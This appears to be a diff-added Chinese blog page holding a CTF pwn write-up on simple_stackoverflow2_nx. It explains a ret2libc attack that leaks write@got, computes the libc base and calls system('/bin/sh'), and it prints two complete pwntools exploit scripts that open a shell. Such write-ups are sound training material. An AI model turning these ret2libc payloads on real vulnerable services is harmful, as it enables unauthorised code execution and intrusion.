+<p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme</p>
+<ul>
+<li><a href="https://github.com/lieanu/LibcSearcher" target="_blank" rel="noopener">https://github.com/lieanu/LibcSearcher</a></li>
+</ul>
+<p>此外，在得到 libc 之后，其实 libc 中也是有 /bin/sh 字符串的，所以我们可以一起获得 /bin/sh 字符串的地址。</p>
+<p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>
+<ul>
+<li>泄露 __libc_start_main 地址</li>
+<li>获取 libc 版本</li>
+<li>获取 system 地址与 /bin/sh 的地址</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行 system(‘/bin/sh’)</li>
+</ul>
+<p>我们一般通过<code>write</code>函数来泄漏libc的相关地址信息</p>
+<p>write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数。且需注意地址置为要调用的函数地址，注意是got地址而不是plt地址。</p>
+<p>则我们的payload1可以写为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(elf.symbols[<span class="string">"write"</span>])+p32(overflow) + p32(<span class="number">1</span>)+p32(elf.got[<span class="string">"write"</span>])+p32(<span class="number">12</span>)</span><br></pre></td></tr></table></figure>
+
+<p>因为我们要重复利用<code>overflow</code>函数，故返回地址需要设置为<code>overflow</code>的起始地址</p>
+<p>但因为程序本身并没有调用<code>system()</code>函数，所以我们并不能直接调用<code>system()</code>来获取shell。但其实我们有<code>write()</code>函数就够了，因为我们可以通过<code>write()</code>函数把中的<code>write()</code>函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的<code>write()</code>函数为什么也能实现<code>write()</code>功能呢? 这是因为linux采用了延时绑定技术，当我们调用<code>write()</code>的时候，系统会将真正的<code>write()</code>函数地址link到got表的<code>write.got</code>中，然后<code>write()</code>会根据<code>write.got</code>跳转到真正的<code>write()</code>函数上去。</p>
+<p>因为<code>system()</code>函数和<code>write()</code>在<code>libc.so</code>中的<code>offset(相对地址)</code>是不变的，所以如果我们得到了<code>write()</code>的地址并且拥有目标服务器上的<code>libc.so</code>就可以根据已知的<code>write()</code>的地址和偏移量计算出<code>system()</code>在内存中的地址了。</p>
+<p>偏移量也可以使用<code>pwntools</code>来进行计算</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">off_set = libc.symbols[<span class="string">'write'</span>] - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br></pre></td></tr></table></figure>
+
+<p>所以libc的基地址也可以计算</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_address = write_address - off_set</span><br></pre></td></tr></table></figure>
+
+<p>则我们的payload2可以写为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(libc.symbols[<span class="string">"system"</span>])+p32(<span class="number">0xcafebabe</span>)+p32(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br></pre></td></tr></table></figure>
+
+<p>最终的Exploit为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	p = process(<span class="string">"./simple_stackoverflow2_nx"</span>)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	leave_ret = <span class="number">0x80484FC</span><span class="comment">#overflow leave ret</span></span><br><span class="line">	overflow = <span class="number">0x080484DB</span></span><br><span class="line">	payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(elf.symbols[<span class="string">"write"</span>])+p32(overflow)</span><br><span class="line">	payload += p32(<span class="number">1</span>)+p32(elf.got[<span class="string">"write"</span>])+p32(<span class="number">12</span>)</span><br><span class="line">	</span><br><span class="line">	p.send(payload)</span><br><span class="line">	</span><br><span class="line">	libc.address = u32(p.recv(<span class="number">4</span>))<span class="number">-0xd5b70</span></span><br><span class="line">	info(<span class="string">"libc : "</span> + hex(libc.address))</span><br><span class="line">	</span><br><span class="line">	payload = <span class="string">"A"</span>*<span class="number">0x24</span>+p32(libc.symbols[<span class="string">"system"</span>])+p32(<span class="number">0xcafebabe</span>)+p32(libc.search(<span class="string">"/bin/sh\x00"</span>).next())</span><br><span class="line">	</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">	elf = ELF(<span class="string">"./simple_stackoverflow2_nx"</span>)</span><br><span class="line">	libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
+
+<p>这题的Exploit还有一种写法，我还不是很能理解，到时候我再填坑吧</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./simple_stackoverflow2'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line"></span><br><span class="line">ret_addr = <span class="number">0x0804A060</span> </span><br><span class="line">bss = <span class="number">0x0804A200</span></span><br><span class="line">write_plt = <span class="number">0x080483C0</span></span><br><span class="line">read_plt = <span class="number">0x080483A0</span></span><br><span class="line">read_got = <span class="number">0x0804A010</span></span><br><span class="line">setbuf_plt = elf.plt[<span class="string">'setbuf'</span>]</span><br><span class="line">setbuf_got = elf.got[<span class="string">'setbuf'</span>]</span><br><span class="line">pppr = <span class="number">0x080485c9</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io, <span class="string">"b *0x80484FD \nc"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(elf.path)  <span class="comment"># , env=&#123;'LD_PRELOAD': 'libc.so.6'&#125;)</span></span><br><span class="line"><span class="comment"># io = remote('localhost', 2333)</span></span><br><span class="line">attach()</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(write_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(setbuf_got)</span><br><span class="line">payload += p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(setbuf_got)</span><br><span class="line">payload += p32(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(setbuf_plt)</span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(setbuf_got+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># io.sendline('a'*36 + p32(ret_addr) + 'a' *32 + shellcode)</span></span><br><span class="line">io.send(<span class="string">'a'</span>*<span class="number">36</span> + payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">setbuf_addr = u32(io.read(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">"setbuf_addr:%08x"</span> % setbuf_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setbuf_offset = <span class="number">0x0065ff0</span></span><br><span class="line">libc.address = setbuf_addr - setbuf_offset</span><br><span class="line">log.info(<span class="string">"libc:%08x"</span> % libc.address)</span><br><span class="line"></span><br><span class="line">payload2 = p32(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">payload2 += <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/08/06/XMAN-2019-╕ú╓▌-PWN-ShellCode/" rel="next" title="XMAN-2019-福州-PWN-ShellCode">
+                  <i class="fa fa-chevron-left"></i> XMAN-2019-福州-PWN-ShellCode
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/08/06/╜Φ╓·DynELF╩╡╧╓╬▐libc╡─┬⌐╢┤└√╙├╨í╜ß/" rel="prev" title="借助DynELF实现无libc的漏洞利用小结">
+                  借助DynELF实现无libc的漏洞利用小结 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#simple-stackoverflow"><span class="nav-number">1.</span> <span class="nav-text">simple_stackoverflow</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#simple-stackoverflow2"><span class="nav-number">2.</span> <span class="nav-text">simple_stackoverflow2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#simple-stackoverflow2-nx"><span class="nav-number">3.</span> <span class="nav-text">simple_stackoverflow2_nx</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
